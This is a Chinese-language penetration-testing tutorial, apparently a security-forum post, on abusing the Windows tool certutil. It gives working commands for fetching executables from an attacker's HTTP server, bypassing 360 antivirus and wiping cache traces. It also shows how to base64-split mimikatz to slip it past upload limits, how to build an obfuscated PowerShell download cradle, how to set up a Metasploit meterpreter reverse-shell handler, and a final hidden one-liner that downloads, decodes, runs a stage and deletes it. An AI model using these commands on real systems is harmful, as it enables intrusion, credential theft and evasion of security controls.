何为certutil
==========

`certutil.exe` 是一个合法Windows文件，用于管理Windows证书的程序。

微软官方是这样对它解释的：

> Certutil.exe是一个命令行程序，作为证书服务的一部分安装。您可以使用Certutil.exe转储和显示证书颁发机构（CA）配置信息，配置证书服务，备份和还原CA组件以及验证证书，密钥对和证书链。

但是此合法Windows服务现已被广泛滥用于恶意用途。

渗透中主要利用其 `下载`、`编码`、`解码`、`替代数据流` 等功能。

这里我首先在命令行用`certutil -?`查看一下`certutil`所有的参数，这里只截图了一部分，接下来就总结一下最常用的几个关于`certutil`在内网渗透中的应用。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0ab8c251e98a2ea5c68eaf3daa83aba622a918a5.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0ab8c251e98a2ea5c68eaf3daa83aba622a918a5.png)

certutil下载文件
============

一般我最常使用的`certutil`的功能就是在cmd环境下下载文件，因为`certutil`是windows自带的exe，所以在使用的时候会比其他exe或者vbs更加方便。但是因为在下载文件的过程中也会创建进程，所以也遭到了各大杀软的拦截。

一般使用`certutil`下载文件的命令为

```php
certutil -urlcache -split -f http://ip/artifact.exe
```

这里介绍一下参数

- `-f`  
    覆盖现有文件。  
    有值的命令行选项。后面跟要下载的文件 url。
- `-split`  
    保存到文件。  
    无值的命令行选项。加了的话就可以下载到当前路径，不加就下载到了默认路径。
- `-URLCache`  
    显示或删除URL缓存条目。  
    无值的命令行选项。  
    （certutil.exe 下载有个弊端，它的每一次下载都有留有缓存。）

这里我在本地搭建一个http服务器，然后在配置了360的虚拟机cmd下进行下载

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ea4a4bd30e6302487cb663245829a8a4f02ac10d.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ea4a4bd30e6302487cb663245829a8a4f02ac10d.png)

我为了更好的还原环境，先与虚拟机建立ipc连接后用psexec得到了命令行的cmd环境

这里我用常规的命令进行下载exe文件的操作遭到了av的拦截

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-29dcd7cb756ea4780c741899449eebc54a94516e.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-29dcd7cb756ea4780c741899449eebc54a94516e.png)

如果超时没有操作的话就会显示拒绝访问

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ff5633b18882fc5f16042ed264bb6af6a9b9b4cb.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ff5633b18882fc5f16042ed264bb6af6a9b9b4cb.png)

这里有两种方法对杀软进行`certutil`下载绕过，本质都是执行两次`certutil`

第一种方法是先执行一个单独的`certutil`，然后再执行下载exe的命令，可以看到这里已经能够成功下载

```php
certutil

certutil -urlcache -split -f http://ip/artifact.exe
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c502984b51bed8e35bd912eaac4ae5918a20de3d.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c502984b51bed8e35bd912eaac4ae5918a20de3d.png)

另外一种方法就是使用windows自带的分隔符`&`和`|`，本质上跟第一种方法一样，相当于执行了两次`certutil`

```php
certutil & certutil -urlcache -split -f http://ip/artifact.exe

certutil | certutil -urlcache -split -f http://ip/artifact.exe
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-14c528f41d57bbc9113812b65e9d069512ab2ca5.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-14c528f41d57bbc9113812b65e9d069512ab2ca5.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6d995d5d4c8b2bc54dade1cf2e22fadf80a43d09.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6d995d5d4c8b2bc54dade1cf2e22fadf80a43d09.png)

这里也可以进行文件的重命名，如果你觉得这个文件名太过于明显容易被管理员发现就可以在下载的时候使用自己设置的名字生成exe

```php
certutil & certutil -urlcache -split -f http://172.20.10.4:8000/artifact.exe nice.exe
```

使用`certutil`下载文件有个弊端就是会产生缓存文件，用如下命令查看：

```php
certutil -urlcache *
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b3fd58ee0edbe8d1c9eb559a41e32f39f76761c6.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b3fd58ee0edbe8d1c9eb559a41e32f39f76761c6.png)

执行删除缓存

```php
certutil -urlcache * delete
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-fe2b3bc67aa1cddaeb8d3ced158650baf94307ae.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-fe2b3bc67aa1cddaeb8d3ced158650baf94307ae.png)

这里如果嫌麻烦的话可以在下载文件的时候加上一个`delete`参数，这样就省去了后面再来清理缓存的麻烦

```php
certutil & certutil -urlcache -split -f http://172.20.10.4:8000/artifact.exe delete
```

certutil base64加解密
==================

之前在实战中就碰到过需要进行内网穿透的时候，代理软件上传不到靶机的情况

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c56d9b5f6415d6848346103d1462773070e70891.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c56d9b5f6415d6848346103d1462773070e70891.png)

这里我上传图片测试能够上传成功

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-3209aaefae35233784c202fb2eed2864e2004cee.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-3209aaefae35233784c202fb2eed2864e2004cee.png)

本地也能够下载下来，但是就是到靶机上下载不下来，这时候就可以使用`certutil`的`encode`和`decode`进行加解密。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0d7a6bf9a4fa4557cc4e8a9243774aa6a2efe917.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0d7a6bf9a4fa4557cc4e8a9243774aa6a2efe917.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-982dba4bc1816b90cd9c9973ef2e62e0bb5db07a.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-982dba4bc1816b90cd9c9973ef2e62e0bb5db07a.png)

`certutil`在内网渗透中的另外一个用处就是进行base64编码。我们知道在内网中需要用到内网代理，一般都会用到nps或者frp，但是如果碰到有杀软限制上传文件大小的情况，这时候我们就可以使用先用encode编码分块上传再使用decode解密。

使用`encode`进行base64编码，然而大小还变大了，这里就可以考虑分成多块传输后再进行整合

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2fe14fb8c8b27a7a6b140ea2f5c23deeb697060f.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2fe14fb8c8b27a7a6b140ea2f5c23deeb697060f.png)

这里我查看了一下生成的`mimikatz.txt`有2.7w行，所以这里我将其拆分为三块，这里顺便说一下快速选择大文件的指定行的操作

在notepad++编辑里面点击`开始/结束选择`，光标会定位到第一行

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-adbac8df20a294f4ea8ff93249fac0fe6bb263fc.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-adbac8df20a294f4ea8ff93249fac0fe6bb263fc.png)

再使用`ctrl + g`切换到行定位，选择要选中的行，因为这里我拆分成3块，所以这里我选择的是第10000行

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-516987b419ad25ed260ffbfab5aa5141aa2f8b5b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-516987b419ad25ed260ffbfab5aa5141aa2f8b5b.png)

再到编辑里面点一下`开始/结束选择`即可选中

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-48298b7fd9a8cdc3333471894a960756883db5a6.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-48298b7fd9a8cdc3333471894a960756883db5a6.png)

这里我把`mimikatz.txt`拆分成了三个txt进行上传

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-71ba4daa9c4c4712236c69bc778831d3dc617ece.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-71ba4daa9c4c4712236c69bc778831d3dc617ece.png)

上传到靶机的C盘目录

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a0bad2effde0c8d030a3011df1c22d37faa1e1ec.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a0bad2effde0c8d030a3011df1c22d37faa1e1ec.png)

这里先把3个txt合并为一个txt`mimikatz.txt`

```php
copy c:\*txt c:\mimikatz.txt    //把c盘根目录下的所有txt合并为mimikatz.txt
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c15b4c82ded12531576e68c7618dcbaf19abdff3.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c15b4c82ded12531576e68c7618dcbaf19abdff3.png)

然后再使用`certutil`的`-decode`参数进行解密，生成`mimikatz.exe`

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-88f3852d0c4ff7569b400ab305bbdcadaa32ed33.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-88f3852d0c4ff7569b400ab305bbdcadaa32ed33.png)

运行一下看看已经合并成功了

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f6b3f7aa79be6d19e474b1a2dab362a0a2cd3503.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f6b3f7aa79be6d19e474b1a2dab362a0a2cd3503.png)

certutil 校验hash值
================

当我们检验一个软件是否被其他人修改过经常会拿原始软件的hash值和现在软件的hash进行比对，使用certutil也能够获取hash值

```php
certutil -hashfile mimikatz.exe MD5 //检验MD5

certutil -hashfile mimikatz.exe SHA1 //检验SHA1

certutil -hashfile mimikatz.exe SHA256 //检验SHA256
```

这里比较上传前后mimikatz.exe的MD5值

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-450b1130189599261b16b43dba9d96caa3aae140.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-450b1130189599261b16b43dba9d96caa3aae140.png)

certutil配合powershell内存加载
========================

这里我在本地实验因为环境变量的原因报错，这里还是粗略的写一下大致实现过程

首先修改powershell策略为可执行脚本

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2e0c79c1cccc01c30bcd235d3e8e0e339226d83e.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2e0c79c1cccc01c30bcd235d3e8e0e339226d83e.png)

下载powershell混淆框架并执行

```powershell
Import-Module .\Invoke-CradleCrafter.ps1

Invoke-CradleCrafter
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e3a4671daee991dc7ac0c699e4eace9e3c8fbfab.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e3a4671daee991dc7ac0c699e4eace9e3c8fbfab.png)

使用msf生成一个payload，在本地起一个http服务器，放到http服务器的目录下

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a7ebc24a5bd3ba0aa138809d112c90e856dff96c.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a7ebc24a5bd3ba0aa138809d112c90e856dff96c.png)

设置url为http服务器目录

```php
set URL http://172.20.10.4:8000/key.txt
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-873dae841deb3ff190680bf7ce9e09d87e0658f0.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-873dae841deb3ff190680bf7ce9e09d87e0658f0.png)

使用以下几个命令进行初始化

```php
Invoke-CradleCrafter> MEMORY

Choose one of the below Memory options:

[*] MEMORY\PSWEBSTRING          PS Net.WebClient + DownloadString method
[*] MEMORY\PSWEBDATA            PS Net.WebClient + DownloadData method
[*] MEMORY\PSWEBOPENREAD        PS Net.WebClient + OpenRead method
[*] MEMORY\NETWEBSTRING         .NET [Net.WebClient] + DownloadString method (PS3.0+)
[*] MEMORY\NETWEBDATA           .NET [Net.WebClient] + DownloadData method (PS3.0+)
[*] MEMORY\NETWEBOPENREAD       .NET [Net.WebClient] + OpenRead method (PS3.0+)
[*] MEMORY\PSWEBREQUEST         PS Invoke-WebRequest/IWR (PS3.0+)
[*] MEMORY\PSRESTMETHOD         PS Invoke-RestMethod/IRM (PS3.0+)
[*] MEMORY\NETWEBREQUEST        .NET [Net.HttpWebRequest] class
[*] MEMORY\PSSENDKEYS           PS SendKeys class + Notepad (for the lulz)
[*] MEMORY\PSCOMWORD            PS COM object + WinWord.exe
[*] MEMORY\PSCOMEXCEL           PS COM object + Excel.exe
[*] MEMORY\PSCOMIE              PS COM object + Iexplore.exe
[*] MEMORY\PSCOMMSXML           PS COM object + MsXml2.ServerXmlHttp
[*] MEMORY\PSINLINECSHARP       PS Add-Type + Inline CSharp
[*] MEMORY\PSCOMPILEDCSHARP     .NET [Reflection.Assembly]::Load Pre-Compiled CSharp
[*] MEMORY\CERTUTIL             Certutil.exe + -ping Argument

Invoke-CradleCrafter\Memory> CERTUTIL

[*] Name          :: Certutil
[*] Description   :: PowerShell leveraging certutil.exe to download payload as string
[*] Compatibility :: PS 2.0+
[*] Dependencies  :: Certutil.exe
[*] Footprint     :: Entirely memory-based
[*] Indicators    :: powershell.exe spawns certutil.exe certutil.exe 
[*] Artifacts     :: C:\Windows\Prefetch\CERTUTIL.EXE-********.pf AppCompat Cache

Invoke-CradleCrafter\Memory\Certutil> ALL

Choose one of the below Memory\Certutil\All options to APPLY to current cradle:

[*] MEMORY\CERTUTIL\ALL\1       Execute ALL Token obfuscation techniques (random order)
```

到这里应该会显示如下代码

```powershell
Invoke-CradleCrafter\Memory\Certutil\All> 1

Executed:
  CLI:  Memory\Certutil\All\1
  FULL: Out-Cradle -Url 'http://172.20.10.4/key.txt' -Cradle 17 -TokenArray @('All',1)

Result:
SV 1O6 'http://172.20.10.4/key.txt';.(Get-Command *ke-*pr*) ((C:\Windows\System32\certutil /ping (Get-Item Variable:\1O6).Value|&(Get-Variable Ex*xt).Value.InvokeCommand.(((Get-Variable Ex*xt).Value.InvokeCommand.PsObject.Methods|?{(Get-Variable _ -ValueOn).Name-ilike'*and'}).Name).Invoke((Get-Variable Ex*xt).Value.InvokeCommand.(((Get-Variable Ex*xt).Value.InvokeCommand|GM|?{(Get-Variable _ -ValueOn).Name-ilike'*Com*e'}).Name).Invoke('*el*-O*',$TRUE,1),[Management.Automation.CommandTypes]::Cmdlet)-Skip 2|&(Get-Variable Ex*xt).Value.InvokeCommand.(((Get-Variable Ex*xt).Value.InvokeCommand.PsObject.Methods|?{(Get-Variable _ -ValueOn).Name-ilike'*and'}).Name).Invoke((Get-Variable Ex*xt).Value.InvokeCommand.(((Get-Variable Ex*xt).Value.InvokeCommand|GM|?{(Get-Variable _ -ValueOn).Name-ilike'*Com*e'}).Name).Invoke('*el*-O*',$TRUE,1),[Management.Automation.CommandTypes]::Cmdlet)-SkipLa 1)-Join"`r`n")

Choose one of the below Memory\Certutil\All options to APPLY to current cradle:

[*] MEMORY\CERTUTIL\ALL\1       Execute ALL Token obfuscation techniques (random order)
```

将混淆的代码保存到本地为`crt.txt`用`certutil`进行`encode`加密

```php
certutil -encode crt.txt crt.cer
```

将`cer.cet`放入http服务器目录下，使用msf开启监听

```php
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 192.168.10.11
lhost => 192.168.10.11
msf6 exploit(multi/handler) > set lport 8888
lport => 8888
msf6 exploit(multi/handler) > run
```

然后靶机执行如下命令即可获得反弹session

```powershell
powershell.exe ‐Win hiddeN ‐Exec ByPasS add‐content ‐path %APPDATA%\crt.cer (New‐Object Net.WebClient).DownloadString('http://172.20.10.4/crt.cer'); certutil ‐decode %APPDATA%\crt.cer %APPDATA%\stage.ps1 & start /b c
md /c powershell.exe ‐Exec Bypass ‐NoExit ‐File %APPDATA%\stage.ps1 & start /b cmd /c del %APPDATA%\crt.cer
```